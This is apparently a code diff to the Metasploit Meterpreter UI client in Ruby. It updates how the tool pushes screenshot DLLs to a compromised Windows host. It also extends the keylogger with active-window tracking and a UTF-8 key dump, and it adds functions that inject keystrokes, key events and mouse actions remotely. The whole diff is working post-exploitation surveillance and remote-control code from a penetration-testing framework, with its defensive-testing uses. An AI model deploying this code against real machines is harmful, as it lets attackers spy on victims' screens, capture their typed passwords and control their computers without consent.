@@ -155,11 +155,27 @@ class UI < Rex::Post::UI
     request = Packet.create_request( 'stdapi_ui_desktop_screenshot' )
     request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY, quality )
 
-    # include the x64 screenshot dll if the host OS is x64
-    if( client.sys.config.sysinfo['Architecture'] =~ /^\S*x64\S*/ )
-      screenshot_path = MeterpreterBinaries.path('screenshot','x64.dll')
+    if client.platform == 'windows'
+      # include the x64 screenshot dll if the host OS is x64
+      if( client.sys.config.sysinfo['Architecture'] =~ /^\S*x64\S*/ )
+        screenshot_path = MetasploitPayloads.meterpreter_path('screenshot','x64.dll')
+        if screenshot_path.nil?
+          raise RuntimeError, "screenshot.x64.dll not found", caller
+        end
+
+        screenshot_dll  = ''
+        ::File.open( screenshot_path, 'rb' ) do |f|
+          screenshot_dll += f.read( f.stat.size )
+        end
+
+        request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_BUFFER, screenshot_dll, false, true )
+        request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_LENGTH, screenshot_dll.length )
+      end
+
+      # but always include the x86 screenshot dll as we can use it for wow64 processes if we are on x64
+      screenshot_path = MetasploitPayloads.meterpreter_path('screenshot','x86.dll')
       if screenshot_path.nil?
-        raise RuntimeError, "screenshot.x64.dll not found", caller
+        raise RuntimeError, "screenshot.x86.dll not found", caller
       end
 
       screenshot_dll  = ''
@@ -167,23 +183,9 @@ class UI < Rex::Post::UI
         screenshot_dll += f.read( f.stat.size )
       end
 
-      request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_BUFFER, screenshot_dll, false, true )
-      request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_LENGTH, screenshot_dll.length )
+      request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_BUFFER, screenshot_dll, false, true )
+      request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_LENGTH, screenshot_dll.length )
     end
-
-    # but always include the x86 screenshot dll as we can use it for wow64 processes if we are on x64
-    screenshot_path = MeterpreterBinaries.path('screenshot','x86.dll')
-    if screenshot_path.nil?
-      raise RuntimeError, "screenshot.x86.dll not found", caller
-    end
-
-    screenshot_dll  = ''
-    ::File.open( screenshot_path, 'rb' ) do |f|
-      screenshot_dll += f.read( f.stat.size )
-    end
-
-    request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_BUFFER, screenshot_dll, false, true )
-    request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_LENGTH, screenshot_dll.length )
 
     # send the request and return the jpeg image if successfull.
     response = client.send_request( request )
@@ -207,8 +209,9 @@ class UI < Rex::Post::UI
   #
   # Start the keyboard sniffer
   #
-  def keyscan_start
+  def keyscan_start(trackwindow=false)
     request  = Packet.create_request('stdapi_ui_start_keyscan')
+    request.add_tlv( TLV_TYPE_KEYSCAN_TRACK_ACTIVE_WINDOW, trackwindow )
     response = client.send_request(request)
     return true
   end
@@ -226,41 +229,63 @@ class UI < Rex::Post::UI
   # Dump the keystroke buffer
   #
   def keyscan_dump
-    request  = Packet.create_request('stdapi_ui_get_keys')
+    request  = Packet.create_request('stdapi_ui_get_keys_utf8')
     response = client.send_request(request)
     return response.get_tlv_value(TLV_TYPE_KEYS_DUMP);
   end
 
   #
-  # Extract the keystroke from the buffer data
+  # Send keystrokes
   #
-  def keyscan_extract(buffer_data)
-    outp = ""
-    buffer_data.unpack("n*").each do |inp|
-      fl = (inp & 0xff00) >> 8
-      vk = (inp & 0xff)
-      kc = VirtualKeyCodes[vk]
+  def keyboard_send(keys)
+    request  = Packet.create_request('stdapi_ui_send_keys')
+    request.add_tlv( TLV_TYPE_KEYS_SEND, keys )
+    response = client.send_request(request)
+    return true
+  end
 
-      f_shift = fl & (1<<1)
-      f_ctrl  = fl & (1<<2)
-      f_alt   = fl & (1<<3)
+  #
+  # Send key events
+  #
+  def keyevent_send(key_code, action = 0)
+    key_data = [ action, key_code ].pack("VV")
+    request = Packet.create_request('stdapi_ui_send_keyevent')
+    request.add_tlv( TLV_TYPE_KEYEVENT_SEND, key_data )
+    response = client.send_request(request)
+    return true
+  end
 
-      if(kc)
-        name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
-        case name
-        when /^.$/
-          outp << name
-        when /shift|click/i
-        when 'Space'
-          outp << " "
-        else
-          outp << " <#{name}> "
-        end
-      else
-        outp << " <0x%.2x> " % vk
-      end
+  #
+  # Mouse input
+  #
+  def mouse(mouseaction, x=-1, y=-1)
+    request  = Packet.create_request('stdapi_ui_send_mouse')
+    action = 0
+    case mouseaction
+    when "move"
+      action = 0
+    when "click", "tap", "leftclick"
+      action = 1
+    when "down", "leftdown"
+      action = 2
+    when "up", "leftup"
+      action = 3
+    when "rightclick"
+      action = 4
+    when "rightdown"
+      action = 5
+    when "rightup"
+      action = 6
+    when "doubleclick"
+      action = 7
+    else
+      action = mouseaction.to_i
     end
-    return outp
+    request.add_tlv( TLV_TYPE_MOUSE_ACTION, action )
+    request.add_tlv( TLV_TYPE_MOUSE_X, x.to_i )
+    request.add_tlv( TLV_TYPE_MOUSE_Y, y.to_i )
+    response = client.send_request(request)
+    return true
   end
 
 protected
